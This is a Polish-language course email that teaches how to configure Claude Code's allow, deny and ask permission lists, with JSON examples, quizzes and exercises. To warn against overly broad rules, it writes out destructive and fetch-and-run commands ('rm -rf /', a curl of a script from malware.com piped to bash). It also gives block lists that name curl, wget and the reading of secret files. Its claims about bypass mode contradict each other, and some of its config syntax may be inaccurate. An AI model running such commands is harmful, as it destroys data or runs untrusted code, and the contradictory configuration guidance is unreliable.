# Mail #03: Allow/Deny Lists - Precyzyjna Kontrola

---

## Przypomnienie z poprzedniej lekcji

Cześć!

W poprzednich mailach z tego modułu poznałeś fundamenty bezpieczeństwa w Claude Code. Dowiedziałeś się, czym jest **sandbox mode** - piaskownica, która ogranicza dostęp Claude'a tylko do katalogu projektu, chroniąc Cię przed przypadkowym wyciekiem wrażliwych danych (np. kluczy SSH z katalogu domowego).

Nauczyłeś się też o **typach i trybach uprawnień**:
- **Permission types** określają, czy Claude może automatycznie wykonywać operacje (auto-approve), musi pytać (ask), czy jest całkowicie blokowany
- **Tryby** jak `bypassPermissions` (wszystko dozwolone), `ask` (pytaj za każdym razem), czy `auto` (inteligentne decyzje)
- Poznałeś różnicę między uprawnieniami globalnymi (cały system) a projektowymi (konkretny folder)

Dziś czas na kolejny poziom: **precyzyjną kontrolę** nad tym, co Claude może, a czego NIE może robić.

---

## 2 pytania do poprzedniej lekcji

Zanim ruszymy dalej, sprawdź swoją wiedzę:

1. **Co to jest sandbox mode i jak chroni Twój system?**
   - Odpowiedź: Sandbox to izolacja na poziomie aplikacji - Claude widzi tylko katalog projektu, w którym został uruchomiony. Nie ma dostępu do innych folderów (np. ~/.ssh, pulpit), co chroni przed wyciekiem wrażliwych danych.

2. **Jaka jest różnica między trybem "ask" a "bypassPermissions"?**
   - Odpowiedź: W trybie "ask" Claude pyta o zgodę przy każdej operacji (Read, Write, Bash). W trybie "bypassPermissions" wszystko jest automatycznie dozwolone bez pytania - przydatne dla zaufanych projektów, ale ryzykowne.

---

## TLDR

W tym mailu dowiesz się:
- Jak działa **allow list** (whitelist) - automatyczne zezwalanie na bezpieczne, powtarzalne operacje
- Czym jest **deny list** (blacklist) - twarda blokada niebezpiecznych komend
- Kiedy używać **ask list** - wymuszanie pytania nawet w trybie auto
- Składnia wzorców (patterns) z wildcards i jak ich nie zepsuć
- Praktyczne konfiguracje dla React/TypeScript i współdzielone profile dla zespołu

---

## Mem z Twittera

Zanim zaczniemy - klasyk każdego programisty:

**["I AM ROOT!" - When you get permission denied](https://programmerhumor.io/programming-memes/when-you-try-to-run-a-command-as-sudo-but-it-says-permission-denied/)**

Moment, kiedy terminal mówi "permission denied" i nagle czujesz się jak osoba bez władzy. Wtedy przypominasz sobie o `sudo` i mówisz "I AM ROOT!". Na szczęście z Claude Code możesz precyzyjnie kontrolować uprawnienia bez przełączania się w super-użytkownika!

---

## Treść lekcji

### Allow List (Whitelist) - Koniec z klikaniem "Yes" 100 razy

Wyobraź sobie taką sytuację: pracujesz z Claude Code nad projektem React. Co chwilę prosi Cię o zgodę:
- "Czy mogę uruchomić `git status`?" → klikasz Yes
- "Czy mogę uruchomić `npm run test`?" → klikasz Yes
- "Czy mogę przeczytać plik `src/components/Button.tsx`?" → klikasz Yes
- "Czy mogę uruchomić `ls`?" → klikasz Yes

Po 20 takich pytaniach masz już dość. **Allow list rozwiązuje ten problem.**

#### Czym jest Allow List?

Allow list (biała lista, allowlist) to lista operacji, które Claude może wykonywać **automatycznie, bez pytania**. To jak VIP-lista na koncercie - jeśli jesteś na liście, wchodzisz bez sprawdzania biletu.

#### Konfiguracja w settings.json

```json
{
  "permissions": {
    "allow": [
      "Bash(npm run:*)",
      "Bash(git status)",
      "Bash(git diff)",
      "Bash(ls)",
      "Read(./src/**)",
      "Glob(**/*)",
      "Grep(**/*)"
    ]
  }
}
```

**Co się tutaj dzieje?**
- `Bash(npm run:*)` - Zezwól na wszystkie komendy `npm run` (test, dev, build, etc.)
- `Bash(git status)` - Konkretna komenda git bez parametrów
- `Read(./src/**)` - Czytanie wszystkich plików w katalogu `src` i podkatalogach
- `Glob(**/*)` - Wyszukiwanie plików wszędzie (bezpieczne, bo tylko listuje nazwy)

**Zauważ:** Separator to **dwukropek** (`:`), nie spacja! `Bash(npm run:test)` oznacza komendę `npm run test`.

#### Przykład biznesowy: Automatyzacja backupów

Załóżmy, że prowadzisz małą firmę i co tydzień robisz backup dokumentów. Zamiast pytać za każdym razem:

```json
{
  "permissions": {
    "allow": [
      "Bash(tar -czf:*)",
      "Bash(rsync:*)",
      "Read(./dokumenty/**)",
      "Read(./faktury/**)",
      "Bash(git add:*)",
      "Bash(git commit:*)"
    ]
  }
}
```

Teraz możesz powiedzieć Claude:
```
> Zrób backup wszystkich faktur z grudnia do archiwum tar.gz i wrzuć do gita
```

Claude wykona wszystko automatycznie, bo każda operacja jest na allow list.

---

### Deny List (Blacklist) - Twarda Blokada

Allow list to uprzejme "proszę wejść". Deny list to **bramkarz z zakazem wstępu** - nie ma negocjacji, nie ma pytania, po prostu NIE.

#### Czym jest Deny List?

Deny list (czarna lista, blocklist) to lista operacji, które Claude **NIE MOŻE wykonać** pod żadnym pozorem. Nawet jeśli użytkownik bezpośrednio poprosi, operacja zostanie odrzucona.

#### Konfiguracja typowych zagrożeń

```json
{
  "permissions": {
    "deny": [
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "Read(*.env)",
      "Read(**/*.key)",
      "Read(**/*.pem)",
      "Edit(package*.json)",
      "Bash(curl:*)",
      "Bash(wget:*)",
      "Bash(git push:--force*)"
    ]
  }
}
```

**Co zablokowaliśmy?**
- `Bash(rm:*)` - Kasowanie plików (bezpieczniej używać git do śledzenia zmian)
- `Bash(sudo:*)` - Komendy z uprawnieniami administratora
- `Read(*.env)` - Pliki środowiskowe z hasłami i kluczami API
- `Read(**/*.key)`, `Read(**/*.pem)` - Klucze prywatne i certyfikaty
- `Edit(package*.json)` - Modyfikacja zależności (może zepsuć projekt)
- `Bash(curl:*)`, `Bash(wget:*)` - Pobieranie plików z internetu (ryzyko malware)
- `Bash(git push:--force*)` - Force push (może nadpisać historię w repozytorium)

#### Przykład: Ochrona szablonów firmowych

Masz szablony dokumentów firmowych (umowy, faktury, oferty) i NIE chcesz, żeby Claude je przypadkowo zmodyfikował:

```json
{
  "permissions": {
    "deny": [
      "Edit(./szablony/**)",
      "Write(./szablony/**)",
      "Bash(rm:./szablony/*)"
    ]
  }
}
```

Teraz możesz powiedzieć:
```
> Na podstawie @szablony/umowa.md wygeneruj nową umowę dla klienta XYZ
```

Claude PRZECZYTA szablon, ale nie będzie mógł go zmodyfikować. Bezpieczeństwo 100%.

---

### Ask List - Wymuszenie Pytania

Czasami nie chcesz ani całkowicie blokować operacji (deny), ani automatycznie zezwalać (allow). Chcesz **świadomie potwierdzić** krytyczne akcje.

#### Czym jest Ask List?

Ask list to lista operacji, które **ZAWSZE** wymuszą pytanie, nawet jeśli masz włączony tryb automatyczny czy bypass.

#### Konfiguracja dla krytycznych operacji

```json
{
  "permissions": {
    "ask": [
      "Bash(npm install*)",
      "Bash(git push*)",
      "Bash(git commit*)",
      "Edit(tsconfig.json)",
      "Edit(.gitignore)",
      "Edit(package.json)",
      "Write(./produkcja/**)"
    ]
  }
}
```

**Kiedy to przydatne?**
- `Bash(npm install*)` - Instalacja pakietów może zmienić `package-lock.json` i dodać zależności
- `Bash(git push*)` - Wysyłasz kod do repozytorium, chcesz to świadomie zaakceptować
- `Edit(tsconfig.json)` - Zmiana konfiguracji TypeScript wpływa na cały projekt
- `Write(./produkcja/**)` - Pliki produkcyjne to krytyczne dane

#### Przykład biznesowy: Kontrola wysyłki materiałów marketingowych

Przygotowujesz newsletter w Markdown. Chcesz, żeby Claude pomagał w pisaniu, ale żebyś TY kontrolował moment "wyślij":

```json
{
  "permissions": {
    "allow": [
      "Read(./newsletter/**)",
      "Edit(./newsletter/draft-*.md)"
    ],
    "ask": [
      "Bash(./scripts/send-newsletter.sh:*)",
      "Write(./newsletter/published/**)"
    ]
  }
}
```

Teraz możesz swobodnie pisać z Claude:
```
> Napisz draft newslettera o nowych produktach w @newsletter/draft-styczen.md
```

Ale kiedy powiesz:
```
> Opublikuj newsletter do klientów
```

Claude ZAPYTA o zgodę przed uruchomieniem skryptu wysyłkowego.

---

### Składnia Patterns z Wildcards - Jak to działa?

Zauważyłeś zapisy jak `./src/**` czy `Bash(npm run:*)`. To **wzorce (patterns)** z wildcardami.

#### Podstawowe symbole

| Symbol | Znaczenie | Przykład | Pasuje do |
|--------|-----------|----------|-----------|
| `*` | Dowolny ciąg znaków (w ramach jednego katalogu) | `*.js` | `app.js`, `index.js` |
| `**` | Dowolny ciąg katalogów | `src/**/*.ts` | `src/utils/api.ts`, `src/components/Button/Button.ts` |
| `?` | Jeden dowolny znak | `test?.js` | `test1.js`, `testA.js` |
| `{a,b}` | Alternatywa | `*.{ts,tsx}` | `App.ts`, `Button.tsx` |
| `:` | Separator dla argumentów komendy | `Bash(git add:.)` | Komenda `git add .` |

#### Przykład: Konfiguracja dla projektu React + TypeScript

```json
{
  "permissions": {
    "allow": [
      "Read(src/**/*.{ts,tsx,js,jsx})",
      "Read(*.{json,md,yml})",
      "Bash(npm run:test)",
      "Bash(npm run:lint)",
      "Bash(git:status|diff)",
      "Edit(src/**/*.{ts,tsx})",
      "Glob(**/*)",
      "Grep(**/*)"
    ],
    "deny": [
      "Read(.env*)",
      "Read(**/*.key)",
      "Read(**/*.pem)",
      "Edit(package*.json)",
      "Edit(*.lock)",
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "Bash(curl:*)",
      "Bash(wget:*)",
      "Bash(git push:--force*)"
    ],
    "ask": [
      "Bash(npm install*)",
      "Bash(git push*)",
      "Bash(git commit*)",
      "Edit(tsconfig.json)",
      "Edit(.gitignore)"
    ]
  }
}
```

To profesjonalna konfiguracja dla pracy zespołowej - bezpieczna, ale wygodna.

---

### Pro-Tip: Używanie Zmiennych w Patterns

Jeśli masz długie listy patterns, możesz używać zmiennych (w niektórych wersjach Claude Code):

```json
{
  "variables": {
    "SECRET_PATTERNS": ".env*|*.key|*.pem|credentials.json",
    "SAFE_EXTENSIONS": "ts|tsx|js|jsx|py|md|json"
  },
  "permissions": {
    "deny": [
      "Read(**/{$SECRET_PATTERNS})"
    ],
    "allow": [
      "Read(**/*.{$SAFE_EXTENSIONS})"
    ]
  }
}
```

**Zalety:**
- Łatwiejsza konserwacja - modyfikujesz pattern w jednym miejscu
- Czytelność - wiadomo, co oznacza `$SECRET_PATTERNS`
- Możliwość współdzielenia zmiennych między projektami

---

### Typowy Błąd: Zbyt Szerokie Wildcards

⚠️ **UWAGA:** Najczęstszy błąd początkujących to zbyt ogólne wzorce!

#### Błąd #1: Zezwolenie na wszystkie komendy Bash

```json
"allow": ["Bash(*)"]  // ❌ NIGDY TAK NIE RÓB!
```

**Problem:** Claude może wykonać `rm -rf /`, `sudo reboot`, `curl http://malware.com/script.sh | bash`.

**Poprawka:** Używaj konkretnych komend lub bezpiecznych prefixów:

```json
"allow": [
  "Bash(npm:*)",
  "Bash(git:status|diff|log)",
  "Bash(pytest:*)",
  "Bash(ls:*)"
]
```

#### Błąd #2: Czytanie wszystkich plików

```json
"allow": ["Read(**)"]  // ❌ Ryzykowne!
```

**Problem:** Claude może przeczytać `.env`, klucze SSH, prywatne dokumenty.

**Poprawka:** Ogranicz do bezpiecznych rozszerzeń i katalogów:

```json
"allow": [
  "Read(src/**/*.{ts,tsx,js,jsx})",
  "Read(docs/**/*.md)",
  "Read(*.json)"
],
"deny": [
  "Read(.env*)",
  "Read(**/*.key)"
]
```

---

### Edge Case: Escaping Znaków Specjalnych

Jak zablokować pliki testowe jak `Button.test.ts` czy `api.spec.tsx`?

#### Problem:

```json
"deny": ["Read(*.test.ts)"]  // ❌ Nie zadziała poprawnie
```

To zadziała tylko dla plików w głównym katalogu, nie w podfolderach.

#### Rozwiązanie:

```json
"deny": [
  "Read(**/*.test.{ts,tsx})",  // ✓ Prawidłowo
  "Read(**/*.spec.*)"           // ✓ Prawidłowo
]
```

Użycie `**` sprawia, że wzorzec działa we wszystkich podkatalogach.

---

### Integracja: Shared Permissions dla Zespołu

Pracujesz w zespole? Stwórzcie wspólne profile uprawnień!

#### Krok 1: Utwórz repozytorium konfiguracji

```bash
company-claude-configs/
├── frontend.json       # React/Vue/Angular
├── backend.json        # Node/Python/Go
├── devops.json         # Terraform/K8s
└── data-science.json   # Jupyter/ML
```

#### Krok 2: Przykładowa konfiguracja `frontend.json`

```json
{
  "permissions": {
    "allow": [
      "Read(src/**/*.{ts,tsx,js,jsx})",
      "Edit(src/**/*.{ts,tsx})",
      "Bash(npm run:*)",
      "Bash(git:status|diff|log)"
    ],
    "deny": [
      "Read(.env*)",
      "Bash(rm:*)",
      "Bash(git push:--force*)"
    ],
    "ask": [
      "Bash(npm install*)",
      "Bash(git push*)"
    ]
  }
}
```

#### Krok 3: Deweloper importuje profil

W swoim lokalnym `.claude/settings.json`:

```json
{
  "extends": "https://raw.githubusercontent.com/firma/claude-configs/main/frontend.json",
  "permissions": {
    "allow": ["Edit(src/my-component/**)"]  // Dodatkowe uprawnienia lokalne
  }
}
```

**Zalety:**
- Spójność w całym zespole
- Łatwe aktualizacje - modyfikujesz jeden plik, wszyscy mają nową konfigurację
- Szybki onboarding nowych osób

---

### Troubleshooting: Ask List Nie Działa w Bypass Mode

#### Objaw:
Masz w konfiguracji `"ask": ["Bash(git push)"]`, ale Claude pushuje bez pytania.

#### Przyczyna:
Tryb `bypassPermissions` OMIJA wszystkie uprawnienia, włącznie z ask list.

#### Rozwiązanie:
W bypass mode używaj `deny` zamiast `ask`:

```json
{
  "permissions": {
    "mode": "bypassPermissions",
    "deny": ["Bash(git push:--force*)"]  // To zadziała nawet w bypass
  }
}
```

**Pamiętaj:** Deny list działa ZAWSZE, niezależnie od trybu!

---

### Przykład Kompletnej Konfiguracji dla Małej Firmy

Prowadzisz jednoosobową działalność i używasz Claude Code do różnych zadań - od kodu po analizę dokumentów:

```json
{
  "permissions": {
    "allow": [
      "Read(projekty/**/*.{ts,tsx,js,py,md})",
      "Read(dokumenty/**/*.{md,txt,pdf})",
      "Read(faktury/**/*.pdf)",
      "Edit(projekty/drafts/**)",
      "Bash(npm run:*)",
      "Bash(git:status|diff|log)",
      "Bash(python:*.py)",
      "Glob(**/*)",
      "Grep(**/*)"
    ],
    "deny": [
      "Read(.env*)",
      "Read(**/*.key)",
      "Read(dokumenty/prywatne/**)",
      "Bash(rm:*)",
      "Bash(sudo:*)",
      "Bash(curl:*)",
      "Edit(szablony/**)"
    ],
    "ask": [
      "Bash(git push*)",
      "Bash(git commit*)",
      "Bash(npm install*)",
      "Write(projekty/produkcja/**)",
      "Bash(./scripts/send-*.sh:*)"
    ]
  }
}
```

**Co osiągnęliśmy?**
- Claude może swobodnie czytać projekty i dokumenty biznesowe
- Nie może dotknąć wrażliwych danych (`.env`, pliki prywatne)
- Zablokowaliśmy niebezpieczne komendy (rm, sudo, curl)
- Szablony są chronione przed edycją
- Krytyczne operacje (git push, wysyłka) wymagają potwierdzenia

---

## Podsumowanie

Kluczowe wnioski z lekcji:

1. **Allow list to wygoda** - zezwól na powtarzalne, bezpieczne operacje (git status, npm run test) i przestań klikać "Yes" 100 razy dziennie.

2. **Deny list to bezpieczeństwo** - zablokuj niebezpieczne komendy (rm, sudo, curl) i wrażliwe pliki (.env, *.key) raz na zawsze. Nie ma negocjacji.

3. **Ask list to kontrola** - wymuszaj potwierdzenie dla krytycznych operacji (git push, npm install) nawet w trybach automatycznych.

4. **Wildcards dają elastyczność** - używaj `*` (jeden katalog), `**` (wszystkie podkatalogi), `{a,b}` (alternatywy) do precyzyjnych wzorców.

5. **Unikaj zbyt szerokich patterns** - `Bash(*)` czy `Read(**)` to potencjalne zagrożenie. Zawsze precyzuj co dokładnie zezwalasz.

6. **Współdzielone profile dla zespołu** - stwórz repozytorium z gotowymi konfiguracjami (frontend.json, backend.json) i importuj je przez `extends`.

---

## 3 pytania kontrolne

1. **Jaka jest różnica między allow list a ask list?**
   - Odpowiedź: Allow list automatycznie zezwala na operacje bez pytania. Ask list wymusza pytanie nawet jeśli masz tryb automatyczny - chcesz świadomie zaakceptować krytyczne akcje.

2. **Dlaczego `"allow": ["Bash(*)"]` to zły pomysł?**
   - Odpowiedź: To zezwala na WSZYSTKIE komendy Bash, włącznie z niszczącymi jak `rm -rf /`, `sudo reboot`, czy pobieranie malware przez `curl`. Zawsze używaj konkretnych komend.

3. **Jak działa deny list w trybie bypassPermissions?**
   - Odpowiedź: Deny list działa ZAWSZE, niezależnie od trybu. Nawet w bypass mode (który omija inne uprawnienia), deny list blokuje operacje bezwzględnie.

---

## 2-3 zadania praktyczne

### Zadanie 1: Stwórz allow list dla swojego projektu
Otwórz plik `.claude/settings.json` w swoim projekcie i dodaj sekcję `allow` z operacjami, które robisz najczęściej (np. git status, npm run, czytanie plików źródłowych). Przetestuj czy Claude przestał pytać o te operacje.

```json
{
  "permissions": {
    "allow": [
      "Bash(git status)",
      "Bash(npm run:test)",
      "Read(src/**/*.js)"
    ]
  }
}
```

Następnie poproś Claude:
```
> Pokaż status gita i uruchom testy
```

Czy zapytał o zgodę, czy wykonał automatycznie?

---

### Zadanie 2: Zabezpiecz wrażliwe pliki przez deny list
Dodaj do konfiguracji deny list z blokowaniem:
- Plików środowiskowych (`.env`, `.env.local`)
- Kluczy prywatnych (`*.key`, `*.pem`)
- Niebezpiecznych komend (`rm`, `sudo`)

```json
{
  "permissions": {
    "deny": [
      "Read(.env*)",
      "Read(**/*.key)",
      "Bash(rm:*)",
      "Bash(sudo:*)"
    ]
  }
}
```

Przetestuj czy działa:
```
> Przeczytaj plik .env i pokaż zawartość
```

Claude powinien odmówić bez możliwości zaakceptowania.

---

### Zadanie 3: Skonfiguruj ask list dla git push
Jeśli pracujesz z repozytorium, ustaw ask list dla operacji git push, żeby zawsze świadomie kontrolować co wysyłasz do zdalnego repo:

```json
{
  "permissions": {
    "ask": [
      "Bash(git push*)",
      "Bash(git commit*)"
    ]
  }
}
```

Następnie poproś Claude o commit i push:
```
> Dodaj wszystkie zmiany do gita, zrób commit i wypchnij do origin/main
```

Claude powinien zapytać o zgodę przed `git commit` i przed `git push`.

---

## Linki do zasobów

Chcesz zgłębić temat? Sprawdź te materiały:

1. **[ProgrammerHumor.io - Permission Denied Memes](https://programmerhumor.io/memes/permissions)** - Kolekcja memów o uprawnieniach i permission denied (EN)

2. **[Claude Code - Oficjalna dokumentacja uprawnień](https://code.claude.com/docs/en/overview)** - Techniczne szczegóły konfiguracji allow/deny/ask lists (EN)

3. **[Twingate Blog - Whitelisting: Secure Access Control](https://www.twingate.com/blog/whitelisting)** - Głębszy artykuł o whitelistingu w kontekście bezpieczeństwa (EN)

4. **[Allowlisting vs. Blocklisting - TechTarget](https://www.techtarget.com/searchsecurity/tip/Allowlisting-vs-blocklisting-Benefits-and-challenges)** - Zalety i wyzwania związane z allowlist vs blocklist (EN)

5. **[Medium - Blacklist vs Allowlist in UX Design](https://medium.com/design-bootcamp/blacklist-and-whitelist-vs-blocklist-and-allowlist-in-ux-design-25d1862b84d4)** - Ewolucja terminologii whitelist/blacklist do allowlist/blocklist (EN)

---

**Do zobaczenia w następnym mailu!**

W kolejnej lekcji poznasz **zaawansowane strategie bezpieczeństwa**: izolację projektów, integrację z narzędziami DevOps, audyt logów operacji Claude, oraz jak skonfigurować Claude Code w środowiskach produkcyjnych z wysokimi wymaganiami bezpieczeństwa (fintech, healthcare, prawne).

Jeśli masz pytania lub coś jest niejasne - śmiało odpisz na tego maila.

Powodzenia!

---

**P.S.** Pamiętaj - dobre uprawnienia to jak dobry zamek w drzwiach. Allow list to klucz dla zaufanych osób, deny list to alarm dla nieproszonych gości, a ask list to domofon - Ty decydujesz kogo wpuścić!
